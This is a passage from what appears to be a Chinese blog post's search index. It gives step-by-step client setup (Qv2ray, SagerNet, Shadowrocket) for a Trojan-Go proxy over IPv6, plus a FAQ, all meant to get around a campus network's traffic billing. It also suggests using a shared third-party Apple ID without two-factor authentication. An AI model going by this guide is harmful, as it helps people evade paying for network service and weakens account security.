\u4ee5\u68c0\u67e5\u662f\u5426\u586b\u5199\u6b63\u786e\u3002</p> <p></p> <p></p> <p>\u7136\u540e\u5728\u8fde\u63a5\u8bbe\u7f6e\u4e2d\u53d6\u6d88\u52fe\u9009 <code>\u7ed5\u8fc7\u4e2d\u56fd\u5927\u9646</code>\uff0c\u5426\u5219\u53ea\u5bf9\u5883\u5916\u57df\u540d/IP \u514d\u6d41\u3002</p> <p></p> <p>\u56de\u5230 Qv2ray\uff0c\u8fdb\u5165\u63d2\u4ef6\uff0c\u9009\u62e9 <code>\u6253\u5f00\u672c\u5730\u63d2\u4ef6\u76ee\u5f55</code> \uff0c\u7136\u540e\u5c06 <code>Qv2ray \u7684 Trojan-Go \u63d2\u4ef6</code>\uff08dll \u6587\u4ef6\uff09\u590d\u5236\u8fdb\u53bb\u3002</p> <p>\u91cd\u542f Qv2ray\uff0c\u518d\u6b21\u8fdb\u5165\u63d2\u4ef6\uff0c\u52fe\u9009 <code>Trojan-Go Plugin</code>\uff0c\u8fdb\u5165\u5176\u8bbe\u5b9a\uff0c\u5c06 <code>Kernel</code> \u8bbe\u7f6e\u4e3a <code>Trojan-Go \u6838\u5fc3</code> \u89e3\u538b\u76ee\u5f55\u4e0b <code>trojan-go.exe</code> \u7684\u8def\u5f84\u3002\u53ef\u4ee5\u70b9\u51fb <code>Test Run...</code> \u4ee5\u68c0\u67e5\u662f\u5426\u8bbe\u7f6e\u6b63\u786e\u3002</p> <p></p> <p>\u6dfb\u52a0\u8282\u70b9\uff1a\u4e3b\u754c\u9762\u4e0b\u65b9 <code>\u65b0\u5efa</code>\uff1a</p> <p></p> <p>\u5982\u56fe\u8bbe\u7f6e\uff0c\u7ea2\u8272\u6846\u662f\u9700\u8981\u66f4\u6539\u7684\u5730\u65b9\u3002\u5176\u4ed6\u7684\u9009\u9879\u5565\u90fd\u4e0d\u9700\u8981\u6539\u5c31\u884c\u3002\u5f53\u7136\u4e86\uff0c\u4f60\u53ef\u4ee5\u628a Mux\uff08\u591a\u8def\u590d\u7528\uff09\u7684 Enable \u52fe\u4e0a\uff0cMux \u5e76\u53d1\u4e00\u822c\u9009\u62e9 8 \u4e2a\u5373\u53ef\uff0c\u5173\u4e8e Mux \u53ef\u4ee5\u53c2\u9605\uff1ahttps://p4gefau1t.github.io/trojan-go/advance/mux/\u3002</p> <p>\u70b9 <code>OK</code> \u4fdd\u5b58\uff0c\u7136\u540e\u5728\u5217\u8868\u91cc\u53cc\u51fb\u8fd9\u4e2a\u8282\u70b9\u5373\u53ef\u8fde\u63a5\u5230\u670d\u52a1\u5668\u3002</p> <p></p> <p>\u4f60\u53ef\u4ee5\u53f3\u952e\u8fd9\u4e2a\u8282\u70b9\uff0c\u7136\u540e\u9009\u62e9 <code>\u6d4b\u91cf\u771f\u5b9e\u5ef6\u8fdf</code>\uff0c\u82e5\u6d4b\u91cf\u7ed3\u679c\u4e0d\u4e3a <code>\u9519\u8bef</code> \u5373\u53ef\u6b63\u5e38\u4f7f\u7528\u3002</p> <p>\u8b66\u544a</p> <p>\u5bf9\u4e8e Windows\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u7684\u7a0b\u5e8f\u90fd\u4f1a\u9075\u5b88\u7cfb\u7edf\u4ee3\u7406\u89c4\u5219\uff0c\u67d0\u4e9b\u7a0b\u5e8f\uff08\u4f8b\u5982 QQ\u3001\u767e\u5ea6\u7f51\u76d8\uff09\u9ed8\u8ba4\u4f1a\u7ed5\u8fc7\u7cfb\u7edf\u89c4\u5b9a\u7684\u4ee3\u7406\uff0c\u9020\u6210\u6d41\u91cf\u6cc4\u9732\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u8bf7\u5728\u5df2\u4f7f\u7528 Qv2ray \u7684\u57fa\u7840\u4e0a\u518d\u4f7f\u7528 SSTap \u7b49\u5176\u4ed6\u900f\u660e\u4ee3\u7406\u8f6f\u4ef6\u4ee5\u5b9e\u73b0\u5168\u5c40\u4ee3\u7406\uff0c\u5f3a\u5236\u8fd9\u4e9b\u7a0b\u5e8f\u4f7f\u7528\u7531 Qv2ray \u521b\u5efa\u7684\u7cfb\u7edf\u4ee3\u7406\uff0c\u5177\u4f53\u65b9\u5f0f\u5982\u4e0b\uff1a</p> <ul> <li> <p>\u4e0b\u8f7d SSTap\uff1ahttps://github.com/solikethis/SSTap-backup</p> </li> <li> <p>\u5b89\u88c5\u5e76\u6253\u5f00 SSTap\uff0c\u82e5\u5b89\u88c5\u8fc7\u7a0b\u4e2d\u5f39\u51fa Windows \u5b89\u5168\u63d0\u793a\uff0c\u8fd9\u662f\u56e0\u4e3a SSTap \u9700\u8981\u4f7f\u7528 OpenVPN \u7684 TAP \u8bbe\u5907\u9a71\u52a8\u6765\u521b\u5efa\u865a\u62df\u7f51\u5361\u4ee5\u5b9e\u73b0\u7c7b\u4f3c VPN \u7684\u6548\u679c\u3002 \u70b9\u51fb <code>\u5b89\u88c5</code> \u5373\u53ef</p> </li> <li> <p>\u51fb\u52a0\u53f7\u65b0\u5efa\u4ee3\u7406\uff0c\u9009\u62e9\u65b0\u5efa SOCKS \u4ee3\u7406\u3002</p> </li> <li> <p>\u670d\u52a1\u5668 IP \u586b\u5199 localhost\uff0c\u7aef\u53e3\u586b\u5199 1089\uff08\u5373 Qv2ray \u9ed8\u8ba4\u7684\u672c\u5730\u5165\u7ad9\u7aef\u53e3\uff0c\u4f60\u53ef\u4ee5\u5728 Qv2ray \u9996\u9009\u9879\u7684\u5165\u7ad9\u8bbe\u7f6e\u4e2d\u627e\u5230\uff09\uff0c\u5176\u4ed6\u7684\u65e0\u9700\u53d8\u66f4\uff0c\u7136\u540e\u4fdd\u5b58\u5373\u53ef\u3002</p> </li> </ul> <p></p> <ul> <li>\u70b9\u51fb <code>\u8fde\u63a5</code> \u5373\u53ef\u4eab\u53d7\u5168\u5c40\u4ee3\u7406\u3002</li> </ul> <p>\u8bf7\u4e0d\u8981\u8bd5\u56fe\u4f7f\u7528 Proxifier \u66ff\u6362 SSTap\uff0c\u8be5\u8f6f\u4ef6\u65e0\u6cd5\u62e6\u622a\u6240\u6709\u8fde\u63a5\u6d41\u91cf\uff08\u5982 UDP\uff09\uff0c\u56e0\u6b64\u53ef\u80fd\u4ecd\u4f1a\u6709\u67d0\u4e9b\u6d41\u91cf\uff08\u4f8b\u5982\u767e\u5ea6\u7f51\u76d8\u4e0b\u8f7d\uff09\u7ed5\u8fc7\u4ee3\u7406\u76f4\u8fde\u3002</p>","tags":["ipv6","nginx","proxy","certbot"]},{"location":"blog/2022/220602-ipv6-bypass-billing-system/#332-sagernet","title":"3.3.2 SagerNet","text":"<p>\u4e0b\u8f7d\u5fc5\u8981 APK\uff1a</p> <ul> <li>SagerNet \u672c\u4f53\uff1aGitHub\uff0cGoogle Play\uff0cF-Droid</li> <li>Trojan-Go \u63d2\u4ef6\uff1aGitHub\uff0cGoogle Play\uff0cF-Droid</li> </ul> <p>\u6216\u8005\u5728 SagerNet \u6587\u6863 \u5904\u4e0b\u8f7d\u4ee5\u4e0a\u4e24\u4e2a APK\u3002</p> <p>\u70b9\u51fb\u53f3\u4e0a\u89d2  \u56fe\u6807\uff0c\u9009\u62e9 <code>\u624b\u52a8\u8f93\u5165</code>\uff0c\u7136\u540e\u9009\u62e9 <code>Trojan Go</code>\u3002\u6309\u7167\u4e0b\u56fe\u8fdb\u884c\u914d\u7f6e\u3002</p> <p></p> <ul> <li>\u914d\u7f6e\u540d\u79f0\uff1a\u968f\u610f\uff0c\u4f60\u81ea\u5df1\u80fd\u770b\u660e\u767d\u5c31\u884c</li> <li>\u670d\u52a1\u5668\uff1a<code>ipv6.cauc.sb</code>\uff08\u9700\u8981\u6539\u6210\u4f60\u81ea\u5df1\u7684\uff09</li> <li>\u670d\u52a1\u5668\u7aef\u53e3\uff1a\u5fc5\u987b\u662f <code>443</code>\uff08\u8fd9\u4e00\u680f\u9ed8\u8ba4\u662f <code>1080</code>\uff0c\u8bb0\u5f97\u6539\u6210 <code>443</code>\uff09</li> <li>\u5bc6\u7801\uff1a<code>sbDJKnmsl23333</code>\uff08\u9700\u8981\u6539\u6210\u4f60\u81ea\u5df1\u7684\uff09</li> <li>\u670d\u52a1\u5668\u540d\u79f0\u6307\u793a\uff1a<code>\u672a\u8bbe\u7f6e</code>\uff08\u7559\u7a7a\u5373\u53ef\uff0c\u6216\u8005\u6539\u6210\u548c\u670d\u52a1\u5668\u4e00\u680f\u76f8\u540c\u4e5f\u884c\uff09</li> <li>\u4f20\u8f93\u534f\u8bae\uff1a<code>NONE</code>\uff08\u9ed8\u8ba4\u5373\u53ef\uff09</li> <li>\u52a0\u5bc6\uff1a<code>NONE</code>\uff08\u9ed8\u8ba4\u5373\u53ef\uff09</li> </ul> <p>\u7136\u540e\u53f3\u4e0a\u89d2\u4fdd\u5b58\u3002</p> <p>\u63a5\u4e0b\u6765\u8bf7\u70b9\u51fb\u5de6\u4e0a\u89d2  \u83dc\u5355\uff0c\u8fdb\u5165 <code>\u8def\u7531</code>\uff0c\u7136\u540e\u53d6\u6d88\u52fe\u9009 <code>\u7ed5\u8fc7\u4e2d\u56fd\u57df\u540d\u89c4\u5219</code>\uff0c\u53d6\u6d88\u52fe\u9009 <code>\u7ed5\u8fc7\u4e2d\u56fdIP\u89c4\u5219</code>\uff0c\u5426\u5219\u53ea\u5bf9\u5883\u5916\u57df\u540d/IP \u514d\u6d41\u3002</p> <p>\u8bf7\u7ee7\u7eed\u6253\u5f00\u83dc\u5355\uff0c\u8fdb\u5165\u8bbe\u7f6e\uff0c\u627e\u5230 <code>IPv6\u8def\u7531</code>\uff0c\u8bf7\u5c06\u6b64\u9009\u9879\u8bbe\u7f6e\u4e3a <code>\u4f18\u5148</code>\u3002</p> <p>\u73b0\u5728\u4f60\u53ef\u4ee5\u4ece\u83dc\u5355\u56de\u5230\u914d\u7f6e\u754c\u9762\uff0c\u70b9\u51fb\u53f3\u4e0b\u89d2  \u5c0f\u98de\u673a\u56fe\u6807\u8fde\u63a5\u5230 VPN\uff0c\u82e5\u70b9\u51fb\u4e0b\u65b9\u533a\u57df\u6d4b\u8bd5\u8fde\u63a5\u53ef\u4ee5\u5f97\u5230\u5ef6\u8fdf\u6570\uff0c\u5373\u53ef\u6b63\u5e38\u4f7f\u7528\u3002</p>","tags":["ipv6","nginx","proxy","certbot"]},{"location":"blog/2022/220602-ipv6-bypass-billing-system/#333-shadowrocket","title":"3.3.3 Shadowrocket","text":"<p>\u5982\u679c\u4f60\u6ca1\u6709\u7f8e\u533a\u6216\u8005\u5176\u4ed6\u975e\u56fd\u533a\u8d26\u53f7\uff0c\u4f60\u53ef\u4ee5\u53bb \u82f9\u679c\u5e1d \u6765\u83b7\u53d6\u4e00\u4e2a\u5df2\u7ecf\u8d2d\u4e70\u4e86 Shadowrocket \u7684\u8d26\u53f7\u3002</p> <p>\u8bf7\u6ce8\u610f</p> <p>\u52a1\u5fc5\u8bf7\u5728 AppStore \u91cc\u9000\u51fa\u5f53\u524d\u5e10\u53f7\u540e\u518d\u767b\u5f55\uff0c\u4e25\u7981\u5728\u7cfb\u7edf\u8bbe\u7f6e\u7684 iCloud \u8d26\u6237\u91cc\u767b\u5f55\uff0c\u5426\u5219\u53ef\u80fd\u4f1a\u9020\u6210\u4f60 iOS/iPad OS \u8bbe\u5907\u4e0a\u7684\u6570\u636e\u88ab\u8fd9\u4e2a iCloud \u8d26\u53f7\u8986\u76d6\uff0c\u4e5f\u6709\u53ef\u80fd\u5bfc\u81f4\u8fd9\u4e2a iCloud \u8d26\u53f7\u76f4\u63a5\u88ab\u5c01\u7981\u3002</p> <p>\u767b\u5f55\u540e\uff0c\u63d0\u793a Apple ID \u5b89\u5168\u9009\u9879\u65f6\u9009\u62e9 <code>\u5176\u4ed6\u9009\u9879</code>\u2014\u2014<code>\u4e0d\u5347\u7ea7</code> \u4ece\u800c\u4e0d\u5347\u7ea7\u53cc\u91cd\u8ba4\u8bc1\u3002</p> <p>\u767b\u5f55\u540e\u641c\u7d22\u5e76\u4e0b\u8f7d <code>Shadowrocket</code>\u3002</p> <p>\u6253\u5f00 Shadowrocket\uff0c\u70b9\u53f3\u4e0a\u89d2\u52a0\u53f7\u3002</p> <p></p> <ul> <li>\u7c7b\u578b\uff1a<code>Trojan</code></li> <li>\u5730\u5740\uff1a<code>ipv6.cauc.sb</code>\uff08\u9700\u8981\u6539\u6210\u4f60\u81ea\u5df1\u7684\uff09</li> <li>\u7aef\u53e3\uff1a\u5fc5\u987b\u662f <code>443</code></li> <li>\u5bc6\u7801\uff1a<code>sbDJKnmsl23333</code>\uff08\u9700\u8981\u6539\u6210\u4f60\u81ea\u5df1\u7684\uff09</li> </ul> <p>\u5176\u4ed6\u7684\u4e0d\u9700\u8981\u6539\uff0c\u7136\u540e\u53f3\u4e0a\u89d2\u4fdd\u5b58\u3002</p> <p>\u548c Qv2ray \u4e00\u6837\uff0c\u4f60\u53ef\u4ee5\u628a Mux\uff08\u591a\u8def\u590d\u7528\uff09\u6253\u5f00\uff0c\u5173\u4e8e Mux \u53ef\u4ee5\u53c2\u9605 Trojan-Go \u6587\u6863\u3002</p> <p>\u5728\u4f7f\u7528\u4e4b\u524d\uff0c\u8bf7\u5c06 <code>\u5168\u5c40\u8def\u7531</code> \u9009\u9879\u6539\u4e3a <code>\u4ee3\u7406</code>\u3002</p> <p></p> <p>\u4f60\u53ef\u4ee5\u70b9\u51fb <code>\u8fde\u901a\u6027\u6d4b\u8bd5</code> \u4ee5\u6d4b\u91cf\u6240\u6709\u8282\u70b9\u7684\u5ef6\u8fdf\u548c\u53ef\u7528\u6027\uff0c\u70b9\u51fb\u4e4b\u540e\u82e5\u53ef\u7528\uff0c\u5219\u4f1a\u5728\u8282\u70b9\u65c1\u8fb9\u663e\u793a\u5177\u4f53\u5ef6\u8fdf\uff0c\u5982\u679c\u4e0d\u53ef\u7528\u5219\u4f1a\u663e\u793a\u8d85\u65f6\u3002</p>","tags":["ipv6","nginx","proxy","certbot"]},{"location":"blog/2022/220602-ipv6-bypass-billing-system/#4","title":"\u7b2c 4 \u7ae0 \u5176\u4ed6","text":"","tags":["ipv6","nginx","proxy","certbot"]},{"location":"blog/2022/220602-ipv6-bypass-billing-system/#41","title":"4.1 \u603b\u7ed3","text":"<p>\u672c\u6587\u4ecb\u7ecd\u4e86\u5982\u4f55\u642d\u5efa\u5e76\u4f7f\u7528\u4ee3\u7406\u670d\u52a1\u5668\u7ed5\u8fc7\u6821\u56ed\u7f51\u8ba1\u8d39\u7cfb\u7edf\u7684\u65b9\u6cd5\u3002</p> <p>\u603b\u7684\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u628a\u6574\u4e2a\u4ee3\u7406\u8def\u5f84\u6982\u62ec\u6210\u8fd9\u6837\uff1a</p> <ol> <li>\u5e94\u7528\u7a0b\u5e8f\uff08\u4f8b\u5982\u4f60\u7684 Firefox\u3001Chrome \u6216\u8005 Steam\uff09<ol> <li>\u5e94\u7528\u7a0b\u5e8f\u9700\u8981\u53d1\u8d77\u8054\u7f51\u8bf7\u6c42</li> <li>\u5e94\u7528\u7a0b\u5e8f\u53d1\u73b0\u7cfb\u7edf\u8bbe\u7f6e\u4e86\u7cfb\u7edf\u4ee3\u7406\u6216\u7cfb\u7edf\u6b63\u5728\u4f7f\u7528 VPN\uff08\u4ee5\u4e0b\u7b80\u79f0 <code>\u672c\u5730\u4ee3\u7406\u670d\u52a1\u5668</code>\uff09</li> <li>\u5e94\u7528\u7a0b\u5e8f\u9075\u5b88\u7cfb\u7edf\u4ee3\u7406\u89c4\u5219\uff0c\u5c06\u8bf7\u6c42\u53d1\u9001\u7ed9\u672c\u5730\u4ee3\u7406\u670d\u52a1\u5668</li> </ol> </li> <li>\u672c\u5730\u4ee3\u7406\u670d\u52a1\u5668\uff08\u88ab\u7cfb\u7edf\u81ea\u52a8\u642d\u5efa\u5728 <code>localhost</code>\uff08\u5373 <code>127.0.0.1</code>\uff09\u4e0a\u7684\u672c\u5730\u4ee3\u7406\u670d\u52a1\u5668\uff0cWindows 10 \u53ef\u5728 <code>\u8bbe\u7f6e</code>-<code>\u7f51\u7edc\u548cInternet</code>-<code>\u4ee3\u7406</code> \u67e5\u770b\uff09<ol> <li>\u672c\u5730\u4ee3\u7406\u670d\u52a1\u5668\u63a5\u7ba1\u6765\u81ea\u5e94\u7528\u7a0b\u5e8f\u7684\u8054\u7f51\u8bf7\u6c42</li> <li>\u672c\u5730\u4ee3\u7406\u670d\u52a1\u5668\u7684\u76ee\u7684\u5730\u6307\u5411\u672c\u5730\u7684 Trojan-Go \u5ba2\u6237\u7aef</li> <li>\u672c\u5730\u4ee3\u7406\u670d\u52a1\u5668\u5c06\u8bf7\u6c42\u5448\u9012\u7ed9 Trojan-Go \u5ba2\u6237\u7aef\u5904\u7406</li> </ol> </li> <li>Trojan-Go \u5ba2\u6237\u7aef\uff08\u5373 Qv2ray\u3001SagerNet \u6216 Shadowrocket \u7b49\uff09<ol> <li>\u5ba2\u6237\u7aef\u6839\u636e\u5206\u6d41\u89c4\u5219\uff08\u4f8b\u5982\u53bb\u5e7f\u544a\u6216\u8005\u7ed5\u8fc7\u5927\u9646\u7b49\uff09\u51b3\u5b9a\u6bcf\u4e2a\u8bf7\u6c42\u7684\u53bb\u5411</li> <li>\u6839\u636e\u6211\u4eec <code>\u4e0d\u7ed5\u8fc7\u4e2d\u56fd\u5927\u9646</code> \u7684\u5206\u6d41\u89c4\u5219\uff0c\u6240\u6709\u7684\u8bf7\u6c42\u5fc5\u987b\u88ab\u4ee3\u7406</li> <li>\u5ba2\u6237\u7aef\u6839\u636e\u6211\u4eec\u4fdd\u5b58\u7684\u8282\u70b9\u4fe1\u606f\uff0c\u5c06\u8bf7\u6c42\u53d1\u9001\u7ed9\u642d\u5efa\u5728\u4e91\u670d\u52a1\u5668\u4e0a\u7684\u670d\u52a1\u7aef</li> </ol> </li> <li>Trojan-Go \u670d\u52a1\u7aef<ol> <li>\u670d\u52a1\u7aef\u9a8c\u8bc1\u6211\u4eec\u7684\u5bc6\u7801\u548c\u5176\u4ed6\u914d\u7f6e\uff0c\u5728\u4e91\u670d\u52a1\u5668\u4e0a\u5b9e\u73b0\u7b2c 1 \u6b65\u4e2d\u7684\u8054\u7f51\u8bf7\u6c42\uff0c\u5f97\u5230\u4e00\u4e2a\u54cd\u5e94</li> <li>\u670d\u52a1\u7aef\u5c06\u8fd9\u4e2a\u54cd\u5e94\u53d1\u56de\u5ba2\u6237\u7aef\u3002\u8fd9\u4e2a\u8bf7\u6c42\u6cbf\u7740\u540c\u6837\u7684\u8def\u5f84\u5f80\u56de\u8d70\uff0c\u7ecf\u8fc7\u5ba2\u6237\u7aef\u3001\u672c\u5730\u4ee3\u7406\u670d\u52a1\u5668\uff0c\u6700\u7ec8\u5230\u8fbe\u5e94\u7528\u7a0b\u5e8f\u3002</li> </ol> </li> </ol>","tags":["ipv6","nginx","proxy","certbot"]},{"location":"blog/2022/220602-ipv6-bypass-billing-system/#42","title":"4.2 \u5e38\u89c1\u95ee\u9898","text":"\u6211\u6b63\u5728\u4f7f\u7528\u8be5\u65b9\u6cd5\u514d\u6d41\uff0c\u4f46\u662f\u7ecf\u67e5\u8be2\u4ecd\u7136\u4f7f\u7528\u4e86\u6211\u7684\u6821\u56ed\u7f51\u6d41\u91cf\u3002 <p>\u82e5\u6d41\u91cf\u6d88\u8017\u6781\u4f4e\uff08\u4f8b\u5982\u6570 KB\uff09\uff0c\u8fd9\u53ef\u80fd\u662f\u7cfb\u7edf\u68c0\u67e5\u7f51\u7edc\u53ef\u7528\u6027\uff08\u8fd9\u4e2a\u64cd\u4f5c\u4f1a\u7ed5\u8fc7\u4ee3\u7406\uff09\u7684\u65f6\u5019\u4ea7\u751f\u7684\u6d41\u91cf\u3002\u82e5\u4ea7\u751f\u7684\u6d41\u91cf\u6d88\u8017\u4e3a\u51e0 MB \u6216\u8005 1 MB \u4ee5\u5185\uff0c\u8fd9\u53ef\u80fd\u662f\u4ecb\u4e8e\u8fde\u63a5\u6821\u56ed\u7f51\u4e4b\u540e\u548c\u5f00\u542f\u4ee3\u7406\u4e4b\u524d\u8fd9\u6bb5\u65f6\u95f4\u4ea7\u751f\u7684\u6d41\u91cf\u3002\u8fd9\u4e24\u7c7b\u6d41\u91cf\u6d88\u8017\u662f\u65e0\u6cd5\u907f\u514d\u7684\u3002</p> <p>\u5982\u679c\u6d88\u8017\u7684\u6d41\u91cf\u5f88\u5927\uff0c\u90a3\u8bf4\u660e\u4f60\u53ef\u80fd\u6ca1\u6709\u6b63\u786e\u914d\u7f6e\u4ee3\u7406\u7b56\u7565\uff0c\u5305\u62ec\u914d\u7f6e\u7ed5\u8fc7\u4e2d\u56fd\u5927\u9646\uff08\u8bf7\u4e0d\u8981\u7ed5\u8fc7\u4e2d\u56fd\u5927\u9646\uff09\uff0c\u4ee5\u53ca\u914d\u7f6e\u7279\u5b9a\u5e94\u7528\u7684\u8fc7\u6ee4\uff08\u8bf7\u4e0d\u8981\u8fc7\u6ee4\u4efb\u4f55\u5e94\u7528\uff09\uff0c\u4ee5\u53ca Windows \u4e0b\u7684\u7279\u5b9a\u95ee\u9898\uff08\u8bf7\u53c2\u8003 3.3.1 Qv2ray\uff09\u3002</p> \u4f7f\u7528 Qv2ray \u65f6\u63d0\u793a Trojan-Go \u5185\u6838\u5d29\u6e83\uff08Trojan-Go Kernel Crashed\uff09\u6216\u8005\u63d0\u793a Trojan-Go \u63d2\u4ef6\u7248\u672c\u4e0d\u53d7\u652f\u6301\uff0c\u4ee5\u53ca\u5176\u4ed6\u4f60\u89c9\u5f97\u53ef\u80fd\u662f\u7248\u672c\u539f\u56e0\u9020\u6210\u7684\u9519\u8bef\u3002 <p>\u6211\u4eec\u65e0\u6cd5\u4fdd\u8bc1\u5bf9\u4e8e\u6240\u6709\u7684\u7248\u672c\u4e4b\u95f4\u90fd\u80fd\u76f8\u4e92\u517c\u5bb9\uff0c\u4f60\u53ef\u4ee5\u5c1d\u8bd5\u4ee5\u4e0b\u7248\u672c\u7ec4\u5408\uff0c\u8fd9\u4e2a\u7ec4\u5408\u81f3\u5c11\u5728 2021 \u5e74 4 \u6708\u662f\u53ef\u7528\u7684\uff1a</p> <ul> <li>Qv2ray\uff1a2.7.0-pre2</li> <li>V2Ray \u6838\u5fc3\uff1a4.37.3</li> <li>Trojan-Go \u6838\u5fc3\uff1a0.8.3</li> <li>Qv2ray \u7684 Trojan-Go \u63d2\u4ef6\uff1a3.0.0-pre3</li> </ul> \u5168\u90e8\u6309\u7167\u6b65\u9aa4\u6765\u3002\u4f46\u662f\u68c0\u67e5 V2Ray \u6838\u5fc3\u8bbe\u7f6e\u65f6\u63d0\u793a V2Ray \u6838\u5fc3\u8fd0\u884c\u5931\u8d25\uff0c\u9000\u51fa\u4ee3\u7801\uff1a2 <p>\u786e\u8ba4\u662f\u7248\u672c\u95ee\u9898\uff0c\u89e3\u51b3\u65b9\u6cd5\u540c\u4e0a\u3002</p> \u4f7f\u7528 Qv2ray \u65f6\u63d0\u793a\u51fa\u7ad9\u89c4\u5219\u4e0d\u53d7\u652f\u6301\u6216\u672a\u77e5\u51fa\u7ad9\u89c4\u5219\uff0c\u4ee5\u81f3\u4e8e\u53d1\u751f V2Ray \u5185\u6838\u5d29\u6e83\uff08V2Ray Kernel Crashed\uff09\u3002 <p>\u8bf7\u6309\u987a\u5e8f\u6392\u67e5\uff1a</p> <ol> <li>\u662f\u5426\u5df2\u7ecf\u6309\u8981\u6c42\u4e0b\u8f7d\u5e76\u90e8\u7f72\u4e86\u6240\u6709\u7684\u5fc5\u8981\u7ec4\u4ef6\uff1f<ol> <li>\u8bf7\u6309\u7167 3.3.1 Qv2ray \u6240\u793a\u5185\u5bb9\u6216\u4e0a\u8ff0\u5e38\u89c1\u95ee\u9898\u91cd\u65b0\u90e8\u7f72\u6240\u6709\u63d2\u4ef6\uff0c\u786e\u4fdd\u4ee5\u4e0b\u4e24\u9879\u90fd\u80fd\u6b63\u786e\u8fdb\u884c\uff0c\u5426\u5219\u8bf7\u91cd\u65b0\u6309\u7167\u6587\u6863\u90e8\u7f72\u8fd9\u4e9b\u7ec4\u4ef6\uff1a<ul> <li><code>\u5185\u6838\u8bbe\u7f6e</code> &gt; <code>\u68c0\u67e5V2Ray\u6838\u5fc3\u8bbe\u7f6e</code></li> <li><code>\u63d2\u4ef6\u5217\u8868</code> &gt; <code>Trojan-Go-Plugin</code> &gt; <code>\u8bbe\u5b9a</code> &gt; <code>Test Run...</code></li> </ul> </li> <li> \u5982\u679c\u4f60\u4f7f\u7528\u94fe\u63a5\u65b9\u5f0f\u6dfb\u52a0\u8282\u70b9 \u8bf7\u4e0d\u8981\u4f7f\u7528 <code>Trojan</code> \u94fe\u63a5\uff0c\u8bf7\u4f7f\u7528 <code>Trojan-Go</code> \u94fe\u63a5\u3002\u867d\u7136 <code>Trojan-Go</code> \u517c\u5bb9\u539f\u7248 <code>Trojan</code> \u534f\u8bae\uff0c\u4f46 Trojan-Go \u63d2\u4ef6\u65e0\u6cd5\u8bc6\u522b <code>Trojan</code> \u94fe\u63a5\u7684 URL \u534f\u8bae\u5934\u90e8 <code>trojan://</code>\uff0c\u56e0\u6b64\u4f1a\u88ab\u8ba4\u4e3a\u662f\u4e0d\u53d7\u652f\u6301\u7684\u51fa\u7ad9\u89c4\u5219\u6216\u672a\u77e5\u51fa\u7ad9\u89c4\u5219\u3002 \u53e6\u5916\u8bf7\u6ce8\u610f\uff0c\u5982\u679c\u4f60\u7684\u8ba2\u9605\u5305\u542b <code>Trojan</code> \u94fe\u63a5\uff0c\u90a3\u4e48\u8fd9\u4e9b\u94fe\u63a5\u5c06\u4e0d\u4f1a\u88ab Qv2ray \u8ba4\u4e3a\u662f\u5408\u6cd5\u94fe\u63a5\uff0c\u4e5f\u4e0d\u4f1a\u88ab\u8ba1\u5165\u8ba2\u9605\u94fe\u63a5\u603b\u6570\uff0c\u9664\u975e\u4f60\u4e0d\u4ec5\u88c5\u4e86 Trojan-Go \u63d2\u4ef6\uff0c\u800c\u4e14\u8fd8\u8981\u88c5\u4e86 Trojan \u63d2\u4ef6\u3002 </li> </ol> </li> </ol> Trojan-Go \u5ba2\u6237\u7aef\u63d0\u793a\u65e0\u6cd5\u8fde\u63a5\u3001\u8fde\u63a5\u8d85\u65f6\u3001SSL \u63e1\u624b\u9519\u8bef\u7b49\u3002 <p>\u8bf7\u6309\u987a\u5e8f\u6392\u67e5\uff1a</p> <ol> <li> \u4f60\u6240\u5728\u7684\u6821\u56ed\u7f51\u662f\u5426\u652f\u6301 IPv6\uff1f \u4e0d\u652f\u6301\u5c31\u4e0d\u8981\u8bd5\u4e86\uff0c\u6d6a\u8d39\u65f6\u95f4\u3002 </li> <li> \u4f60\u662f\u5426\u5df2\u7ecf\u767b\u5f55\u6821\u56ed\u7f51\u8d26\u53f7\uff1f \u8fd9\u4e2a\u4e0d\u89e3\u91ca\u3002 </li> <li> \u4f60\u8bbe\u5907\u7684\u7f51\u7edc\u914d\u7f6e\u662f\u5426\u663e\u793a\u62e5\u6709\u516c\u7f51 IPv6 \u5730\u5740\uff1f \u6ca1\u6709\u7684\u8bdd\uff0c\u53ef\u80fd\u662f\u4f60\u6240\u5728\u7684\u8def\u7531\u5668\u4e0d\u652f\u6301 IPv6\uff0c\u4e5f\u6709\u53ef\u80fd\u662f\u4f60\u8bbe\u5907\u4e0a\u7684\u7f51\u7edc\u914d\u7f6e\u51fa\u9519\uff08\u6bd4\u5982\u53e4\u8001\u7684 Windows \u7248\u672c\uff09\u3002\u8bf7\u53c2\u8003 1.3 IPv6 \u73af\u5883 \u5bfb\u6c42\u89e3\u51b3\u65b9\u6848\u3002 </li> <li> \u4f60\u662f\u5426\u80fd\u901a\u8fc7\u6d4f\u89c8\u5668\u76f4\u63a5\u8bbf\u95ee\uff08\u5305\u62echttps\u548chttp\uff09\u4f60\u642d\u5efa\u670d\u52a1\u5668\u7684\u5730\u5740\uff1f \u8fd9\u4e2a\u95ee\u9898\u5c31\u591a\u8d77\u6765\u4e86\uff0c\u5148\u4e0d\u8981\u6000\u7591\u81ea\u5df1\u7684\u7f51\u7ad9\u88ab\u5c01\u9501\u4e86\uff0c\u6709\u53ef\u80fd\u662f\u7f51\u7ad9\u914d\u7f6e\u51fa\u9519\uff0c\u5148\u4e0a\u670d\u52a1\u5668\u91cd\u542f\u4e00\u4e0b Trojan-Go \u548c Nginx\uff0c\u6216\u8005\u91cd\u65b0\u6309\u6b65\u9aa4\u4e00\u6b65\u4e00\u6b65\u6765\u8bbe\u7f6e\uff0c\u53ef\u80fd\u662f\u54ea\u4e00\u6b65\u7684\u8bbe\u7f6e\u51fa\u9519\u4e86\u3002 \u5982\u679c\u786e\u4fe1\u8bbe\u7f6e\u6ca1\u9519\uff0c\u90a3\u5c31\u53bb\u7f51\u7edc\u6d4b\u8bd5\u7f51\u7ad9\uff08\u6bd4\u5982 IPIP.NET\u3001ping.cn \u4e4b\u7c7b\u7684\uff09ping \u4e00\u4e0b\u4f60\u7684\u7f51\u7ad9\uff0c\u770b\u770b\u662f\u4e0d\u662f\u88ab\u5c01\u9501\u4e86\u3002\u5982\u679c\u88ab\u5c01\u9501\u4e86\u90a3\u4f60\u53ea\u80fd\u81ea\u8ba4\u5012\u9709\u3002 \u8bf7\u6ce8\u610f\uff1a\u5982\u679c Nginx \u914d\u7f6e\u5b8c\u5168\u6b63\u786e\uff0c\u90a3\u4e48 http 